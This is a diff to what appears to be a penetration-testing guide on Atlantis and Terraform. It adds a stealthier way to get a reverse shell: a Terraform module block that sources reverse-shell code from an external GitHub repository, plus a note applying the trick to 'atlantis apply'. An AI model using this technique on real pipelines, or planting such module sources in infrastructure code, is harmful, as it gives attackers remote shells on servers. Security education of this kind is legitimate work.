@@ -189,6 +189,16 @@ data "external" "example" {
 }
 ```
 
+You can perform this attack even in a **more stealth way**, instead of adding the rev shell directly into the terraform file, you can **load an external resource** that contains the rev shell:
+
+```javascript
+module "not_rev_shell" {
+  source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
+}
+```
+
+You can find the rev shell code in [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)
+
 ### Atlantis apply RCE - Config modification in new PR
 
 If you have write access over a repository you will be able to create a new branch on it and generate a PR. If you can **execute `atlantis apply` you will be able to RCE inside the Atlantis server**.
@@ -218,6 +228,8 @@ resource "null_resource" "rev_shell" {
   }
 }
 ```
+
+As in the previous exploitation technique you could probably **load an external resource instead of writing the malicious payload** directly in the terraform file.
 
 ### Terraform Param Injection
 
